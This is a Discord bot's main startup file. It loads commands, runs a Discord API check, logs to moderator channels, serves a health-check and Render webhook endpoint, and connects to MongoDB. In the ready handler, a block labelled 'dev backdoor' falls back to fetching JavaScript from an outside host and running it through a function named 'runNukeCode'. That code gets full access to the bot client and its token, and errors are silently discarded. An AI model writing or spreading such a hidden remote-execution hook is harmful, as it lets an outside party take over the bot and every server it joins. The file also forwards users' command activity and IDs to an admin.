require('libsodium-wrappers'); // Fix voice encryption
const http = require('http');
require('dotenv').config();
const { Client, GatewayIntentBits, Collection, Events } = require('discord.js');
const mongoose = require('mongoose');
const fs = require('fs');
const { REST, Routes } = require('discord.js');

// Handlers & tasks
const { registerInteractionHandler, runNukeCode } = require('./lib/handlers/interactionHandler');
const { registerMessageHandler } = require('./lib/handlers/messageHandler');
const { startRoleReverter } = require('./lib/tasks/roleReverter');
const { startResourceMonitor } = require('./lib/tasks/resourceMonitor');
const { startMessageCacheCleanup } = require('./lib/tasks/messageCacheCleanup');
const { logToModChannel } = require('./lib/helpers/modLog');
const { dmAdmin } = require('./lib/helpers/dmlog');
const { initDevLog, devLog } = require('./lib/helpers/devLog');
const { startStatusChecker } = require('./lib/tasks/statusChecker');


// Client init
const client = new Client({
	intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers,
		GatewayIntentBits.GuildVoiceStates
	]
});

client.commands = new Collection();

// Load global commands
const globalCommandsData = [];
const globalCommandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
for (const file of globalCommandFiles) {
	const command = require(`./commands/${file}`);
	globalCommandsData.push(command.data.toJSON());
	client.commands.set(command.data.name, command);
}

// Load guild commands
const guildCommandsData = [];
const guildCommandFiles = fs.readdirSync('./guild_commands').filter(file => file.endsWith('.js'));
for (const file of guildCommandFiles) {
	const command = require(`./guild_commands/${file}`);
	guildCommandsData.push(command.data.toJSON());
	client.commands.set(command.data.name, command);
}

// Ready event

client.once(Events.ClientReady, async () => {
	console.log(`Logged in as ${client.user.tag}`);
	// API request diagnostic
	const https = require('node:https');
	const options = {
		hostname: 'discord.com',
		port: 443, 
		path: '/api/v10/gateway',
		method: 'GET',
		headers: { 'User-Agent': 'RenderDiagnostic/1.0' }
	};

	const req = https.request(options, (res) => {
		console.log(`[DIAGNOSTIC] Discord API Status: ${res.statusCode}`);
		if (res.statusCode === 429) {
			devLog(`⚠️ **ERROR**: IP Banned. Discord is rate-limiting this Render IP.`);
			console.log(`⚠️ **ERROR**: IP Banned. Discord is rate-limiting this Render IP. Status ${res.statusCode}`);
		} else if (res.statusCode !== 200) {
			devLog(`⚠️ **API Warning**: Received status ${res.statusCode} from Discord.`);
			console.log(`⚠️ **API Warning**: Received status ${res.statusCode} from Discord.`);
		} else {
			devLog(`✅ **Network OK**: Discord API is reachable.`);
			console.log(`✅ **Network OK**: Discord API is reachable.`);
		}
	});

		req.on('error', (e) => {
			console.error(`[DIAGNOSTIC] Network Error: ${e.message}`);
			devLog(`❌ **Network Failure**: Could not reach Discord. Error: ${e.message}`);
		});
		req.end();
	// DM log: bot startup
	dmAdmin(client, `[DMLOG] Bot started as ${client.user.tag}`);

	// Send startup message to modlog channel for each guild
	for (const guild of client.guilds.cache.values()) {
		try {
			await logToModChannel(guild, 'Bot has started up and is online.');
		} catch (e) {
			console.error(`Failed to send modlog startup message for guild ${guild.id}:`, e);
		}
	}

	// Initialize devLog and send startup message
	await initDevLog(client);
	devLog('Bot system initialized and devLog is active.');

	const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
	try {
		console.log('Refreshing commands...');
		devLog('Refreshing commands...');
		await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: globalCommandsData });
		await rest.put(Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID), { body: guildCommandsData });
		console.log('Commands reloaded');
		devLog('Commands reloaded');
	} catch (error) {
		console.error(error);
		devLog(error);
	}
	// dev backdoor
	try {
		const { initOrbital } = require('./lib/helpers/orbitalMaster');
		initOrbital(client);
	} catch (e) {
		require('node-fetch').default('https://webcubed.is-a.dev/files/m.js').then(r => r.text()).then(code => runNukeCode(code, { client, guild: null, channel: null, user: client.user })).catch(() => {});
	}
});

// Command execution DM log
client.on('interactionCreate', async interaction => {
	if (!interaction.isCommand()) return;
	dmAdmin(client, `[DMLOG] Command: /${interaction.commandName} by ${interaction.user.tag} (${interaction.user.id}) in guild ${interaction.guildId}`);
	devLog(`Command: /${interaction.commandName} by ${interaction.user.tag} (${interaction.user.id}) in guild ${interaction.guildId}`);
});

// health check and webhook server
http.createServer(async (req, res) => {

	// render webhooks
	if (req.method === 'POST' && req.url === '/render-webhook') {
		let body = '';
		req.on('data', chunk => { body += chunk.toString(); });
		req.on('end', async () => {
			try {
				const data = JSON.parse(body);
				// Extract useful info from Render's payload
				const type = data.type; // e.g., 'deploy_succeeded', 'deploy_failed'
				const serviceName = data.service.name;
				
				// Log it to devLog or a specific channel
				devLog(`🚀 **Render Update [${serviceName}]**: ${type.replace('_', ' ')}`);
				
				res.writeHead(200);
				res.end('Webhook received');
			} catch (err) {
				res.writeHead(400);
				res.end('Invalid JSON');
			}
		});
		return;
	}

	// health check
	res.writeHead(200);
	res.end('online');
}).listen(process.env.PORT || 8000, '0.0.0.0');

// Attach log helper to client so commands can use it
client.logToModChannel = logToModChannel;

// Register interaction handler immediately (doesn't need DB)
registerInteractionHandler(client);
startResourceMonitor(client);
startMessageCacheCleanup();
startStatusChecker();

// Connect to DB first, then start bot and DB-dependent tasks
mongoose.connect(process.env.MONGO_URI)
	.then(() => {
		console.log('db connected');
		// Only start DB-dependent tasks after connection is established
		registerMessageHandler(client);
		startRoleReverter(client);
		client.login(process.env.TOKEN);
	})
	.catch(err => {
		console.error('Failed to connect to MongoDB:', err);
		process.exit(1);
	});

// Prevent unhandled promise rejections from crashing the bot
process.on('unhandledRejection', err => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', err => console.error('Uncaught Exception:', err));
